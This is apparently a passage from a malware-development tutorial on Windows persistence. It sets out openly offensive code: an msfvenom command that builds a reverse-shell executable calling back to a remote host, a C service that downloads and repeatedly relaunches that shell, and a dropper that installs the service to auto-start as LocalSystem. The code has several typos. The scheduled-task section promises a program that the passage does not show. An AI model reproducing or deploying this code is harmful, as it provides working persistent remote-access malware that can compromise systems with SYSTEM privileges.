+<p>There are many ways a Windows Service can be used to establish persistence on a system. By modifying the <code>ImagePath</code> of a legitimate service in the Windows Registry (specifically under <code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;Service Name&gt;</code>), an adversary can redirect the service to run an arbitrary executable. If the permissions (Access Control List) on a service are misconfigured, a lower-privileged user or process may be able to stop, start, or modify it, allowing an adversary to easily control its execution. Also, if a service loads a Dynamic Link Library from a predictable, poorly secured location, an attacker can replace or place a malicious DLL in said location so it is loaded when the legitimate service starts.</p>
+<p>Here, we will observe how an attacker (with adequate privileges) can create a new service that is configured to start automatically when the system boots. By setting the services executable path <code>binPath</code> to their malicious program, the malware will run with high privileges (often <code>SYSTEM</code>) and maintain long-term access.</p>
+<p>To start, create a reverse shell executable:</p>
+<pre><code class="language-bash">$ msfvenom -p windows/x64/shell_reverse_tcp \
+LHOST=172.30.1.41 \
+LPORT=4444 -f exe &gt; hack_cmd.exe
+</code></pre>
+<p>The next step is to create a malicious service:</p>
+<pre><code class="language-C">// mal_service.c
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;io.h&gt;
+#include &lt;time.h&gt;
+
+#define SLEEP_TIME 5000
+#define F_OK 0
+
+SERVICE_STATUS serviceStatus;
+SERVICE_STATUS_HANDLE hStatus;
+STARTUPINFO si;
+PROCESS_INFORMATION pi;
+HANDLE* phProcess;
+
+void ServiceMain(int argc, char** argv);
+void ControlHandler(DWORD request);
+
+int Hack(){
+    char exe[] = "C:\\Windows\\System32\\hack_cmd.exe";
+    BOOL fileDoesntExist = _access(exe, F_OK);
+    if(fileDoesntExist){
+        HRESULT downloadedFile = URLDownloadToFile(NULL, "http://172.30.1.41:8000/hack_cmd.exe", exe, 0, NULL);
+        if(downloadedFile){
+            printf("[Hack-&gt;URLDownloadToFile] &gt;&gt;&gt; Hmmm... something went wrong. %d\n", GetLastError());
+            return -1;
+        }
+    }
+    while(serviceStatus.dwCurrentState == SERVICE_RUNNING){
+        ZeroMemory(&amp;pi, sizeof(pi));
+        ZeroMemory(&amp;si, sizeof(si));
+        si.cb = sizeof(si);
+
+        if(CreateProcess(NULL, exe, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi)){
+            phProcess = &amp;pi.hProcess;
+            DWORD exitCode;
+            while(serviceStatus.dwCurrentState == SERVICE_RUNNING){
+                if(GetExitCodeProcess((HANDLE)*phProcess, &amp;exitCode)){
+                    if(exitCode != STILL_ACTIVE){
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
+                        int sleep_time = rand() % (1200001) + 60000;
+                        Sleep(sleep_time);
+                        break;
+                    } else {
+                        Sleep(240000);
+                    }
+                }
+            }
+        } else {
+            Sleep(60000);
+        }
+    }
+    return 0;
+}
+
+int main(){
+    SERVICE_TABLE_ENTRY ServiceTable[] = {
+        {"HackService", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
+        {NULL, NULL}
+    };
+    StartServiceCtrlDispatcher(ServiceTable);
+    return 0;
+}
+
+void ServiceMain(int argc, char** argv){
+    serviceStatus.dwServiceType = SERVICE_WIN32;
+    serviceStatus.dwCurrentSTate = SERVICE_START_PENDING;
+    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    serviceStatus.dwWin32ExitCode = 0;
+    serviceStatus.dwServiceSpecificExitCode = 0;
+    serviceStatus.dwCheckPoint = 0;
+    serviceStatus.dwWaitHint = 0;
+    hStatus = RegisteredServiceCtrlHandler("HackService", (LPHANDLER_FUNCTION)ControlHandler);
+    SetServiceStatus(hStatus, &amp;serviceStatus);
+    serviceStatus.dwCurrentState = SERVICE_RUNNING;
+    SetServiceStatus(hStatus, &amp;serviceStatus);
+    Hack();
+
+    while (serviceStatus.dwCurrentState == SERVICE_RUNNING){
+        Sleep(SLEEP_TIME);
+    }
+    return;
+}
+
+void ControlHandler(DWORD request){
+    switch(request){
+        case SERVICE_CONTROL_STOP:
+            serviceStatus.dwWin32ExitCode = 0;
+            serviceStatus.dwCurrentState = SERVICE_STOPPED;
+            SetServiceStatus(hStatus, &amp;serviceStatus);
+            CloseHandle((HANDLE)*phProcess);
+            return;
+        case SERVICE_CONTROL_SHUTDOWN:
+            serviceStatus.dwWin32ExitCode = 0;
+            serviceStatus.dwCurrentState = SERVICE_STOPPED;
+            SetServiceStatus(hStatus, &amp;serviceStatus);
+            CloseHandle((HANDLE)*phProcess);
+            return;
+        default:
+            break;
+    }
+
+    SetServiceStatus(hStatus,&amp;serviceStatus);
+    return;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>SERVICE_TABLE_ENTRY</code>: A Windows API structure used to tell the <strong>Service COntrol Manager (SCM)</strong> where the actual service logic begins inside a service executable. It acts as a mapping between a service's name and its entry point function.
+<pre><code class="language-C">typedef struct _SERVICE_TABLE_ENTRY{
+   LPSTR lpServiceName;
+   LPSERVICE_MAIN_FUNCTION lpServiceProc;
+} SERVICE_TABLE_ENTRY, *LPSERVICE_TABLE_ENTRY
+</code></pre>
+Here are the <code>SERVICE_TABLE_ENTRY</code> structure's attributes:
+<ul>
+<li><code>lpServiceName</code>: The short name of the service. For shared process services, this is essential. For own process services, it is ignored but often set to the service's name or a null string.</li>
+<li><code>lpServiceProc</code>: A function pointer to the service's <code>ServiceMain</code> function which the SCM will execute to start the service's core operations.</li>
+</ul>
+</li>
+</ul>
+<div id="admonition-note-2" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-2-title">
+<div class="admonition-title">
+<div id="admonition-note-2-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-2"></a>
+</div>
+<div>
+<p><strong>NOTE</strong>
+A service executable must create an array of these structures, called the <strong>dispatch table</strong>, and pass it to the <code>StartServiceCtrlDispatcher</code> function. The last entry of this array must be <code>{NULL, NULL}</code> to signal the end of the table to the SCM. When a single executable hosts multiple services, it is called a <strong>shared service</strong>.</p>
+</div>
+</div>
+<ul>
+<li>
+<p><code>StartServiceCtrlDispatcher</code>: The critical initial function that every Windows service executable must call to register the service executable's entry points with the SCM. When the SCM launches a service executable, the executable's <code>main()</code> or <code>WinMain()</code> function must immediately call this API, causing the calling thread to block and the SCM to take over, using the provided information to launch the specified service's <code>ServiceMain</code> function on a new thread.</p>
+<pre><code class="language-C">BOOL StartServiceCtrlDispatcher(
+    [in] const SERVICE_TABLE_ENTRY *lpServiceTable
+);
+</code></pre>
+<p>Here is a breakdown of the <code>StartServiceCtrlDispatcher</code> function's parameter:</p>
+<ul>
+<li><code>lpServiceTable</code>: A pointer to an array of <code>SERVICE_TABLE_ENTRY</code> structures.
+<code>StartServiceCtrlDispatcher</code> returns <code>TRUE</code> if the function successfully dispatched the service's threads. The calling thread remains blocked until all registered services running in that executable have terminated. It returns <code>FALSE</code> if function execution failed. Use <code>GetLastError()</code> to retrieve the error code.</li>
+</ul>
+</li>
+<li>
+<p><code>SERVICE_STATUS</code>: A fundamental Windows API data type used by a service to report its current status and control information sent back to the Service Control Manager.</p>
+<pre><code class="language-C">typedef struct _SERVICE_STATUS{
+    DWORD dwServiceType;
+    DWORD dwCurrentState;
+    DWORD dwControlsAccepted;
+    DWORD dwWin32ExitCode;
+    DWORD dwServiceSpecificExitCode;
+    DWORD dwCheckPoint;
+    DWORD dwWaitHint;
+}
+SERVICE_STATUS, *LPSERVICE_STATUS;
+</code></pre>
+<p>Here is a breakdown of the <code>SERVICE_STATUS</code> structure's attributes:</p>
+<ul>
+<li>
+<p><code>dwServiceType</code>: Specifies the type of the service.</p>
+<ul>
+<li><code>SERVICE_WIN32_OWN_PROCESS</code> (Most Common): The service runs in a process unique to it.</li>
+<li><code>SERVICE_WIN32_SHARE_PROCESS</code>: The service shares a single process with other services.</li>
+<li><code>SERVICE_KERNEL_DRIVER</code>: A device driver</li>
+</ul>
+</li>
+<li>
+<p><code>dwCurrentState</code>: The most important attribute, as it reports the service's current operational state.</p>
+<ul>
+<li><code>SERVICE_RUNNING</code>: The service is operating normally</li>
+<li><code>SERVICE_STOPPED</code>: The service is not running</li>
+<li><code>SERVICE_START_PENDING</code>: The service is starting up and initializing</li>
+<li><code>SERVICE_PAUSED</code>: The service paused (not operational, but held in memory).</li>
+</ul>
+</li>
+<li>
+<p><code>dwControlsAccepted</code>: Specifies which control codes (commands) the service is prepared to handle via its <code>HandlerEx</code> function.
+_ <code>SERVICE_ACCEPT_STOP</code>: The service can be sent a <code>STOP</code> command.
+_ <code>SERVICE_ACCEPT_PAUSE_CONTINUE</code>: The service can be send <code>PAUSE</code> and <code>CONTINUE</code> commands.
+_ <code>SERVICE_ACCEPT_SHUTDOWN</code>: The service will be notified before the system shuts down.
+_ <code>SERVICE_ACCEPT_PARAMCHANGE</code>: The service can accept changes to its configuration parameters.</p>
+<blockquote>
+<p>Multiple values can be OR'ed (<code>|</code>) together.</p>
+</blockquote>
+</li>
+<li>
+<p><code>dwWin32ExitCode</code>: Reports a standard Win32 error code when a service is stopping or stopped.</p>
+<ul>
+<li><code>NO_ERROR</code>(0): Used if the service terminated normally or if the state is not <code>SERVICE_STOPPED</code>.</li>
+<li>Any <code>ERROR</code> Code: Used to report a standard Windows error code, if the service failed to start or stopped unexpectedly.</li>
+</ul>
+</li>
+<li>
+<p><code>dwServiceSpecificExitCode</code>: Reports a service-defined, custom error code when the service is stopping or stopped. Values are the same as above.</p>
+</li>
+<li>
+<p><code>dwCheckPoint</code>: Used only when the service is in a pending state (<code>SERVICE_START_PENDING</code>, <code>SERVICE_STOP_PENDING</code>, etc.). It provides a value that increments periodically as the service progresses through a long initialization or termination task. It provides feedback to the SCM, proving that the service is still alive and making progress, preventing the SCM from prematurely thinking the service has frozen and killing it.</p>
+</li>
+<li>
+<p><code>dwWaitHint</code>: The estimated time, in milliseconds, that the service expects to spend on an operation while in a pending state. The SCM will not mark the service as frozen until this time has elapsed. The service must update both <code>dwCheckPoint</code> and <code>dwWaitHint</code> periodically if the operation takes longer than the hint.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>RegisterServiceCtrlHandler</code>: A key Windows API call used by a service executable to establish a callback mechanism with the Service Control Manager. It registers a function within the service executable that the SCM can call whenever an administrative tool sends a control command to the service (i.e., <code>STOP</code>, <code>PAUSE</code>, <code>SHUTDOWN</code>, <code>INTERROGATE</code>, etc.)</p>
+<pre><code class="language-C">SERVE_STATUS_HANDLE RegisterServiceCtrlHandler(
+    [in] LPCSTR lpServiceName,
+    [in] LPHANDLER_FUNCTION lpHandlerProc
+);
+</code></pre>
+<p>Here is a breakdown of the <code>RegisterServiceCtrlHandler</code> function's parameters:</p>
+<ul>
+<li><code>lpServiceName</code>: The short name of the service. Must be the same name passed to the <code>CreateService</code> function during installation.</li>
+<li><code>lpHandlerProc</code>: A function pointer to the Service Control Handler, which must have a specific signature that accepts a single <code>DWORD</code> representing the control code.</li>
+</ul>
+<p>The function has a modernized version, <code>RegisterServiceCtrlHandlerEx</code>, which is preferred in new development because it allows for a user defined context pointer:</p>
+<pre><code class="language-C">SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerEx(
+    [in] LPCSTR lpServiceName,
+    [in] LPHANDLER_FUNCTION_EX lpHandlerProc,
+    [in] LPVOID lpContext
+);
+</code></pre>
+<p>Here is a breakdown of the <code>RegisterServiceCtrlHandlerEx</code> function's parameters:</p>
+<ul>
+<li><code>lpServiceName</code>: The short name of the service.</li>
+<li><code>lpHandlerProc</code>: A function pointer to the extended Service Control Handler function. This handler has a more complex signature, accepting additional parameters (<code>dwEventType</code>, <code>lpEventData</code>, <code>lpContext</code>)</li>
+<li><code>lpContext</code>: An optional user-defined context pointer, which is passed to the Service Control Handler, allowing the handler to access service specific data or state information easily.</li>
+</ul>
+<p>Both versions of the function return a <code>SERVICE_STATUS_HANDLE</code>, which is used in all subsequent calls to <code>SetServiceStatus</code> to report any state changes within the service back to the SCM. They return <code>NULL</code> if they fail.</p>
+</li>
+<li>
+<p><code>SetServiceStatus</code>: The primary line of communication from a service to the Service Control Manager (SCM). Allows the service to report its current operational state, exit codes, and progress during long operations. It must be called throughout the lifecycle of a service to inform the SCM of changes in its state.</p>
+<ul>
+<li><code>Initialization</code>: Tells the SCM it is starting up (<code>SERVICE_START_PENDING</code>)</li>
+<li><code>Running</code>: Confirms the service is operational (<code>SERVIE_RUNNING</code>)</li>
+<li><code>Stopping</code>: Requests more time while shutting down if cleanup takes a while (<code>SERVICE_STOP_PENDING</code>)</li>
+<li><code>Keep-Alive</code>: Updates the <code>CheckPoint</code> value during pending operations so the SCM doesn't assume the service has hung and kill it.</li>
+</ul>
+<pre><code class="language-C">BOOL SetServiceStatus(
+    [in] SERVICE_STATUS_HANDLE hServiceStatus,
+    [in] LPSERVICE_STATUS lpServiceStatus
+);
+</code></pre>
+<p>Here is a breakdown of the <code>SetServiceStatus</code> function's parameters:</p>
+<ul>
+<li><code>hServiceStatus</code>: A handle to the service's status information structure, which acts as the ID card for your service instance, ensuring the status update is applied to the correct service in the SCM is database.</li>
+<li><code>lpServiceStatus</code>: A pointer to a <code>SERVICE_STATUS</code> structure that contains that latest values for the service's state. Should be filled in beforehand.
+<code>SetServiceStatus</code> returns <code>TRUE</code> if the operation succeeded, <code>FALSE</code> otherwise.</li>
+</ul>
+</li>
+<li>
+<p><code>_access</code>: A <code>C</code>/<code>C++</code> runtime library function used to perform a pre-check before attempting a file operation. It is exported in <code>io.h</code>.</p>
+<pre><code class="language-C">int _access(
+    const char *path,
+    int mode
+)
+</code></pre>
+<p>Here is a breakdown of the <code>_access</code> function's parameters:</p>
+<ul>
+<li><code>path</code>: A pointer to a null-terminated string specifying the full path and filename of the file or directory to check.</li>
+<li><code>mode</code>: An integer value specifying the accessibility check to perform. This is created by combining (<code>|</code>) the following constands:</li>
+<li><code>F_OK</code> (<code>00</code>): Checks for file existence only</li>
+<li><code>R_OK</code> (<code>04</code>): Checks for read permissions</li>
+<li><code>W_OK</code> (<code>02</code>): Checks for write permissions</li>
+<li><code>X_OK</code> (<code>01</code>): Checks for execute permissions</li>
+</ul>
+<p><code>_access</code> returns an integer value to indicate the result of the check. <code>0</code> indicates success (the file exists or permission has been granted). <code>-1</code> indicates a failure (the file does not exist or permission has not been granted).</p>
+</li>
+<li>
+<p><code>GetExitCodeProcess</code>: A Windows API function used to retrieve the termination status of the specified process. Used to check if a monitored process is still running without forcing the calling thread to wait for the process to terminate.</p>
+<pre><code class="language-C">BOOL GetExitCodeProcess(
+    [in] HANDLE hProcess,
+    [out] LPDWORD lpExitCode
+);
+</code></pre>
+<p>Here is a breakdown of the <code>GetExitCodeProcess</code> function's parameters:</p>
+<ul>
+<li><code>hProcess</code>: A handle to the process whose termination status is to be queries. This handle must have <code>PROCESS_QUERY_INFORMATION</code> access rights.</li>
+<li><code>lpExitCode</code>: A pointer to a variable that receives the process termination status (the exit code).
+<ul>
+<li><code>STILL_ACTIVE</code>: If the process is still running,the pointer will receive the value <code>STILL_ACTIVE</code> (0x103)</li>
+<li><strong>Any Other Value</strong> is the exit code returned by the process's main function or the value passed to the <code>EXITPROCESS</code> function.</li>
+</ul>
+</li>
+</ul>
+<p><code>GetExitCodeProcess</code> returns a <code>BOOL</code>. <code>0</code> is failure, non-zero is success.</p>
+</li>
+<li>
+<p><code>Sleep</code>: A Windows API function that suspends the execution of the current thread for a specified number of milliseconds.</p>
+<pre><code class="language-C">VOID Sleep(
+    DWORD wdMilliseconds
+);
+</code></pre>
+<p>Here is a breakdown of the <code>Sleep</code> function's parameters:</p>
+<ul>
+<li><code>dwMilliseconds</code>: The number of milliseconds the thread should pause for.
+<ul>
+<li><code>Sleep(1000)</code> pauses for 1 second</li>
+<li><code>Sleep(0)</code> yields the thread's remaining time slice</li>
+<li><code>Sleep(INFINITE)</code> blocks indefinitely</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Now that we have our payload and our service executable, we need to create a dropper, which will install the service executable, register it with the SCM, and start it:</p>
+<pre><code class="language-C">// dropper_service.c
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;io.h&gt;
+
+#define F_OK 0
+
+LPCSTR lpServiceName = "HackService";
+LPCSTR lpDisplayName = "Malware Dev Hacking Service";
+LPCSTR lpPath = "C:\\Windows\\System32\\mal_service.exe";
+
+int main(){
+    if(_access(lpPath, F_OK)){
+        HRESULT downloadedFile = URLDownloadToFile(NULL, "http://172.30.1.41:8000/mal_service.exe", lpPath, 0, NULL);
+        if(downloadedFile != S_OK){
+            print("Hmm... something went wrong. %d\n", GetLastError());
+            return 0;
+        }
+    }
+
+    SC_HANDLE hSCM = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CREATE_SERVICE);
+    if(hSCM == NULL){
+        printf("[main-&gt;OpenSCManager] &gt;&gt;&gt; Hmm... something went wrong. %d\n", GetLastError());
+        return 0;
+    }
+
+    SC_HANDLE hService = CreateService(
+        hSCM,
+        lpServiceName,
+        lpDIsplayName,
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_AUTO_START,
+        SERVICE_ERROR_NORMAL,
+        lpPath,
+        NULL, NULL, NULL,
+        "LocalSystem",
+        NULL
+    );
+
+    if(hService == NULL){
+        printf("[main-&gt;CreateService] &gt;&gt;&gt; Hmm... something went wrong. %d\n", GetLastError());
+        return 0;
+    }
+
+    BOOL bResult = StartService(hService, 0, NULL);
+    if(!bResult){
+        printf("[main-&gt;StartService] &gt;&gt;&gt; Hmm... something went wrong. %d\n", GetLastError());
+        return 0;
+    }
+
+    if (hService)
+        CloseServiceHandle(hService);
+
+    CloseServiceHandle(hSCM);
+    return 0;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li>
+<p><code>OpenSCManager</code>: A fundamental Windows API call used to establish a connection and obtain a handle to the Service Control Manager database on a specified machine. Before a program can perform any action on a service (i.e., create, delete, start, stop, query, etc.), it must first successfully call <code>OpenSCManager</code>. Exported in <code>winsvc.h</code>.</p>
+<pre><code class="language-C">SC_HANDLE OpenSCManager(
+    [in, optional] LPCSTR lpMachineName,
+    [in, optinoal] LPCSTR lpDatabseName,
+    [in] DWORD dwDesiredAccess
+);
+</code></pre>
+<p>Here is a breakdown of the <code>OpenSCManager</code> function's parameters:</p>
+<ul>
+<li><code>lpMachineName</code>: Speficies the name of the target machine where teh SCM resides.
+<ul>
+<li><code>NULL</code> or an empty string connects to the SCM on the local computer.</li>
+</ul>
+</li>
+<li><code>lpDatabaseName</code>: Specifies the SCM database to open.
+<ul>
+<li><code>NULL</code> or <code>SERVICES_ACTIVE_DATABASE</code> opens the default active database, containing all services installed on the system.</li>
+</ul>
+</li>
+<li><code>dwDesiredAccess</code>: Specifies the access rights required for the connection. These flags determine what actions the calling process is permitted to perform once the handle is obtained. They can be combined using the OR operator (<code>|</code>):
+<ul>
+<li><code>SC_MANAGER_CONNECT</code>: Permission to connect to the SCM.</li>
+<li><code>SC_MANAGER_CREATE_SERVICE</code>: Ability to install new Services with <code>CreateService</code>.</li>
+<li><code>SC_MANAGER_ENUMERATE</code>: Ability to list all services in the database using <code>EnumServicesStatusEx</code>.</li>
+<li><code>SC_MANAGER_ALL_ACCESS</code>: Full control over the SCM and all its operations.</li>
+</ul>
+</li>
+</ul>
+<p><code>OpenSCManager</code> returns a Service Control Handle (<code>SC_HANDLE</code>) if successful, <code>NULL</code> upon failure.</p>
+</li>
+<li>
+<p><code>CreateService</code>: A key function in the Windows Service API, used to install (register) a new Windows Service with the Service Control Manager database. It is typically called by a service installation program or administrative tool and is important for defining the fundamental properties of a service, such as its name, executable path, and startup mode. It is exported in <code>winscv.h</code>.</p>
+<pre><code class="language-C">SC_HANDLE CreateService(
+    [in] SC_HANDLE hSCManager,
+    [in] LPCSTR lpServiceName,
+    [in, optional] LPCSTR lpDisplayName,
+    [in] DWORD dwDesiredAccess,
+    [in] DWORD dwServiceType,
+    [in] DWORD dwStartType,
+    [in] DWORD dwErrorControl,
+    [in, optional] LPCSTR lpBinaryPathName,
+    [in, optional] LPCSTR lpLoadGroup,
+    [in, optional] LPDWORD lpdwTagId,
+    [in, optional] LPCSTR lpDependencies,
+    [in, optional] LPCSTR lpServiceStartName,
+    [in, optional] LPCSTR lpPassword
+);
+</code></pre>
+<p>Here is a breakdown of the <code>CreateService</code> function's parameters:</p>
+<ul>
+<li><code>hSCManager</code>: A handle to the SCM database with <code>SC_MANAGER_CREATE_SERVICE</code> access rights. Obtained from <code>OpenSCManager</code>.</li>
+<li><code>lpServiceName</code>: The short, unique name of the service. This is the registry key name. Cannot exceed 256 characters.</li>
+<li><code>lpDisplayName</code>: The user-friendly name displayed in the Services snap-in (<code>services.msc</code>). Cannot exceed 256 characters.</li>
+<li><code>dwDesiredAccess</code>: Specifies the access to the newly created service handle. Often set to <code>SERVICE_ALL_ACCESS</code> or <code>SERVICE_START</code></li>
+<li><code>dwServiceType</code>: The type of service being created (ie., <code>SERVICE_WIN32_OWN_PROCESS</code> or <code>SERVICE_WIN32_SHARE_PROCESS</code>)</li>
+<li><code>dwStartType</code>: Specifies when the service should start.
+<ul>
+<li><code>SERVICE_AUTO_START</code>: Boots when the system starts up.</li>
+<li><code>SERVICE_DEMAND_START</code>: Dictates that the service must be started manually (<code>sc start &lt;service&gt;</code>)</li>
+</ul>
+</li>
+<li><code>dwErrorControl</code>: Specifies the severity of the error if the service fails to start.</li>
+<li>'lpBinaryPathName': The full path to the service executable, which runs when starting the service.</li>
+<li><code>lpLoadGroup</code>: The name of the load ordering group this service belongs to. Usually <code>NULL</code>.</li>
+<li><code>lpdwTagId</code>: A unique tag value given to the service if it is part of a group. Usually <code>NULL</code>.</li>
+<li><code>lpDependencies</code>: A list of services that must start before this service can start. A doubly null-terminated list of short service names; usually <code>NULL</code>.</li>
+<li><code>lpServiceStartName</code>: The account name under which the service will run. Typically <code>LocalSystem</code>, <code>LocalService</code>, or a specific user account.</li>
+<li><code>lpPassword</code>: The password for the specified user account in <code>lpServiceStartName</code>. <code>NULL</code> if running under a built-in account (i.e., 'LocalSystem').</li>
+</ul>
+<p><code>CreateService</code> returns a SC_HANDLE value upon success, <code>NULL</code> upon failure.</p>
+</li>
+<li>
+<p><code>StartService</code>: A fundamental Windows Service API function used to initiated the execution of an installed Windows Service. It is exported in <code>winsvc.h</code>.</p>
+<pre><code class="language-C">BOOL StartService(
+    [in] SC_HANDLE hService,
+    [in] DWORD dwNumServiceArgs,
+    [in, optional] LPCSTR *lpServiceArgVectors
+);
+</code></pre>
+<p>Here is a breakdown of the <code>StartService</code> function's parameters:</p>
+<ul>
+<li><code>hService</code>: A handle to the service object. Must have been obtained previously from <code>OpenService</code> or <code>CreateService</code> with <code>SERVICE_START</code> access rights.</li>
+<li><code>dwNumServiceArgs</code>: The number of arguments in the <code>lpServiceArgVectors</code> array. <code>0</code> if no args are passed.</li>
+<li><code>lpServiceArgVectors</code>: An optional array of pointers to null-terminated strings that represent arguments to be passed to the service's <code>ServiceMain</code>.
+Returns <code>TRUE</code> is successful execution. This does not mean the service is runing. <code>FALSE</code> if the operation failed. Commonly due to <strong>Access Denied</strong>, <strong>Database Locked</strong>, or <strong>Service Already Running</strong>.</li>
+</ul>
+</li>
+<li>
+<p><code>CloseServiceHandle</code>: A fundamental Windows Service API call used to release an open handle to a Service Control manager object, such as the database itself or an individual service object. Failure to close handles can lead to resource leaks.</p>
+<pre><code class="language-C">BOOL CloseServiceHandle(
+    [in] SC_HANDLE hSCObject
+);
+</code></pre>
+<p>Here is a breakdown of the function's parameowters:</p>
+<ul>
+<li><code>hSCObject</code>: The handle to the SCM object that needs to be closed.</li>
+</ul>
+<p><code>CloseServiceHandle</code> returns <code>TRUE</code> if successful, <code>FALSE</code> upon failure. Usually because the handle was invalid or already closed.</p>
+</li>
+</ul>
+<div id="admonition-note-3" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-3-title">
+<div class="admonition-title">
+<div id="admonition-note-3-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-3"></a>
+</div>
+<div>
+<p><strong>NOTE</strong>
+This persistence method requires a High Integrity Level by default, as it requires the <code>SC_MANAGER_CREATE_SERVICE</code> access right. However, if the Access Control List on the SCM database (or the specific registry key) is modified to explicitly grant the permission to a lower-privileged user or group, the method may not require elevated privileges. It is important to enumerate users and groups to determine what privileges are available and from where.</p>
+</div>
+</div>
+<h2 id="scheduled-tasks"><a class="header" href="#scheduled-tasks">Scheduled Tasks</a></h2>
+<p><strong>Scheduled tasks</strong> let uses and administrators automate repetitive actions, such as running backups, launching applications, performing system maintenance, or sending notifications. They are managed through the <strong>Windows Task Scheduler</strong>, which lets users define tasks by specifying triggers (i.e., specific times, system startup, logon, or other events) and actions (i.e., running a program or displaying a message).</p>
+<p>Windows offers two main APIs for creating Scheduled Tasks in <code>C</code> or <code>C++</code>: The <strong>Task Scheduler 1.0 API</strong> and the <strong>Task Scheduler 2.0 API</strong>. For new applications targeting current Windows versions, the Task Scheduler 2.0 API is strongly recommended because of its advanced features and compatibility. It is compatible with Windows Vista+, and it uses <strong>Component Object Model</strong> (COM) interfaces, such as <code>ITaskService</code>, <code>ITaskDefinition</code> and <code>IActionCollection</code>. It is exported through <code>taskschd.h</code>.</p>
+<div id="admonition-note-4" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-4-title">
+<div class="admonition-title">
+<div id="admonition-note-4-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-4"></a>
+</div>
+<div>
+<p>The <strong>Component Object Model</strong> (COM) is a Microsoft technology that provides standard interface for software components to interact with one another, enabling language agnostic, modular, and distributive software development. COM is used as the underlying architecture for many of Microsoft's core technologies, including:</p>
+<ul>
+<li><strong>DirectX</strong></li>
+<li><strong>The Windows Shell</strong></li>
+<li><strong>WinRT</strong></li>
+<li><strong>The Task Scheduler API</strong></li>
+</ul>
+</div>
+</div>
+<p>Scheduled tasks require at least a medium integrity level by default. However, elevated users can create scheduled tasks that run with higher privileges, under system accounts.</p>
+<p>Here, we will examine an example of a malicious scheduled task payload, which installs a reverse shell payload from a remote server and schedules it to run when the system starts.</p>
+<div id="admonition-note-5" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-5-title">
+<div class="admonition-title">
+<div id="admonition-note-5-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-5"></a>
+</div>
+<div>
+<p><strong>Cross-Compiling Scheduled Task Programs Can Be Difficult</strong>. The following program defines signature's for certain Windows Service Data types, which are not accessible to cross-compilers by default. This makes the program much longer than it would otherwise have to be, though it can now successfully be compiled and run on a Windows System, so long as the correct libraries are linked during compilation.</p>
+</div>
+</div>
+<p>Where:</p>
+<ul>
+<li><code>SysAllocString</code>: A standard Windows API function used in <strong>Component Object Model</strong> (COM) programming, which safely allocates memory for a new BSTR (Basic String) and copies a given wide-character string into it.
+<ul>
+<li>Part of the <strong>OLE Automation API</strong> (<code>oleaut32.dll</code>). It is essential for creating strings that are correctly formatted and managed for use by COM interfaces.</li>
+<li>A <code>BSTR</code> is a special type of string used by COM and Automation. It is a pointer to the first character of the string, but the memory allocated immediately preceding the string data contains a 32-bit length prefix indicating the total number of bytes in the string (not including the final null terminator). This length prefix is what makes <code>BSTR</code> a safe and efficient option in COM.</li>
+<li>If <code>SysAllocString</code> succeeds, the memory for the new <code>BSTR</code> is allocated, and the caller is responsible for freeing it later using the corresponding API function <code>SysFreeString</code>.</li>
+</ul>
+<pre><code class="language-C">BSTR SysAllocString(
+    [in, optional] const OLECHAR *sz
+);
+</code></pre>
+Here is a breakdown of the <code>SysAllocString</code> function's parameters:
+<ul>
+<li><code>sz</code>: A pointer to a null-terminated, wide-character string that will be copiued into the new BSTR
+On success, <code>SysAllocString</code> returns a pointer to the newly allocated <code>BSTR</code> string. On failure, it returns <code>NULL</code>.</li>
+</ul>
+</li>
+<li><code>CoInitializeEx</code>: A fundamental Windows API function that is required to initialize the COM library for the calling thread. Every thread that uses COM services must call this function before making any other COM-related calls. It prepares the thread's infrastructure to correctly create and manage COM objects and interfaces.
+<pre><code class="language-C">HRESULT CoInitializeEx(
+    [in, optinal] LPVOID pvReserved,
+    [in] DWORD dwCoInit
+);
+</code></pre>
+Here is a breakdown of the <code>CoInitializeEx</code> function's parameters:
+<ul>
+<li><code>pvReserved</code>: A reserved pointer value that must always be set to <code>NULL</code>.</li>
+<li><code>dwCoInit</code>: The flag that specified the concurrency model the thread will use for COM objects. This is the critical parameter. Usually set using one of the following flags, often combined:
+_ <code>COINIT_APARTMENTTHREADED</code>: Initializes the thread as an Apartment thread. All COM calls on this thread are serialized (queued) by COM, meaning object codes do not need to handle concurrent access.
+_ <code>COINIT_MULTITHREADED</code>: Initializes the thread as a Free Thread. COM allows concurrent calls to objects created on this thread, meaning the object's code must handle its own thread synchronization (locking).
+_ <code>COINIT_DISABLE_OLE1DDE</code>: Disables the OLE DDE support.
+_ <code>COINIT_SPEED_OVER_MEMORY</code>: Instructs COM to favor performance over memory usage.
+<code>CoInitializeEx</code> returns an <code>HRESULT</code> value, which indicates success or failure:</li>
+<li><code>Success</code>: <code>S_OK</code> or <code>S_FALSE</code>, meaning COM was already initialized on the thread</li>
+<li><code>Failure</code>: Any value where <code>FAILED(hr)</code> evaluates to <code>TRUE</code>.</li>
+</ul>
+</li>
+</ul>
+<div id="admonition-note-6" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-6-title">
+<div class="admonition-title">
+<div id="admonition-note-6-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-6"></a>
+</div>
+<div>
